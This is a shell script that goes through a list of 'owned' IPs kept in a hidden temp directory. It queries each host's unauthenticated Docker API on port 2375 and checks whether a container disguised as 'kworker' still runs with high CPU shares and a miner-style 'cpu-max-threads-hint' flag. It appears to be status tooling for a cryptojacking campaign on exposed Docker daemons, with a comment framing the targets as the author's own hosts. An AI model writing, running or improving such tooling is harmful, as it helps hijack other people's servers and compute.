#!/bin/sh
# Rollout check across hosts we own: is our container still there, and with what settings?
# Version-pinned on purpose - old engines and api proxies 404 on *unversioned* dynamic
# routes such as /containers/<name>/json, which made an earlier run report 59/59 "gone".
W=/tmp/.sysd/.hunt
exec > /tmp/_ver2b.out 2>&1
tot=0; api_ok=0; present=0; cpu2048=0; hint=0; pinfo=0; mock=0
# NB read ip *and* the trailing field: dock.owned is "ip<TAB>container", and `read -r ip`
# alone keeps the tab, which silently poisons every URL built from it.
while read -r ip rest; do
    [ -n "$ip" ] || continue
    tot=$((tot + 1))
    v=$(curl -fsS -m 5 "http://$ip:2375/version" 2>/dev/null) || v=""
    case "$v" in *ApiVersion*) ;; *) echo "$ip no-api"; continue ;; esac
    api_ok=$((api_ok + 1))
    a=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
    if [ -n "$a" ]; then u="http://$ip:2375/v$a"; else u="http://$ip:2375"; fi
    # Name route first: dock.sh's own method, and the only thing that works on the API
    # proxies in this population (they 404 the id route and return an empty list while
    # still serving /containers/<name>/json). Then fall back to the list, with and
    # without ?all=1, and inspect by id.
    j=$(curl -fsS -m 6 "$u/containers/kworker/json" 2>/dev/null) || j=""
    if [ -z "$j" ]; then
        for q in '?all=1' ''; do
            l=$(curl -fsS -m 6 "$u/containers/json$q" 2>/dev/null) || l=""
            line=$(printf '%s' "$l" | grep -m1 '/kworker')
            id=$(printf '%s' "$line" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
            if [ -n "$id" ]; then j=$(curl -fsS -m 6 "$u/containers/$id/json" 2>/dev/null); fi
            [ -n "$j" ] && break
        done
    fi
    if [ -z "$j" ]; then echo "$ip container-absent"; continue; fi
    # a mock/proxy answers the name route with {} (no Id) - it never really ran anything
    if ! printf '%s' "$j" | grep -q '"Id"'; then mock=$((mock + 1)); echo "$ip mock-no-id"; continue; fi
    present=$((present + 1))
    # docker inspect is compact, but fixture/mock daemons may space after the colon
    cs=$(printf '%s' "$j" | grep -o '"CpuShares": *[0-9]*' | head -1 | cut -d: -f2 | tr -d ' ')
    [ "$cs" = "2048" ] && cpu2048=$((cpu2048 + 1))
    h=0
    if printf '%s' "$j" | grep -q cpu-max-threads-hint; then h=1; hint=$((hint + 1)); fi
    nc=$(curl -fsS -m 5 "http://$ip:2375/info" 2>/dev/null | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
    [ -n "$nc" ] && pinfo=$((pinfo + 1))
    echo "$ip cpu=${cs:-?} hint=$h ncpu=${nc:-?}"
done < "$W/dock.owned"
echo "TOTAL=$tot api_ok=$api_ok real_container=$present cpu2048=$cpu2048 with_hint=$hint info_ok=$pinfo mock_hosts=$mock"
